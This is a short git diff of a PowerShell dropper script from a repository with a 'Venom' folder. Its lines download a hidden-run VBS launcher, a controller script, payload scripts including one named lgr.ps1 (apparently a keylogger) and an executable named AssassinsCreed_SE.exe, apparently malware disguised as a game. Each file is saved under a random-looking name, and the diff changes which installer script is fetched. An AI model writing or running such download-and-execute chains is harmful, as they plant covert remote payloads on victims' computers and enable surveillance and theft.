@@ -72,7 +72,7 @@ Invoke-WebRequest -OutFile "config.json" -Uri "https://raw.githubusercontent.com
 Invoke-WebRequest -OutFile "ZDaFvwjOosKx.vbs" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/RunHidden.vbs"
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/lgr.ps1" -OutFile "KVbOiPPcus.ps1"
 Invoke-WebRequest -OutFile "vaoYIkVglzTJ.cmd" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/payloads/controller.cmd"
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/lgr.ps1" -OutFile "ZYHGCKXWlonm.ps1"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/installers/fly.ps1" -OutFile "ZYHGCKXWlonm.ps1"
 Invoke-WebRequest -OutFile "AssassinsCreed_SE.exe" -Uri "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/AssassinsCreed_SE.exe"
 
 
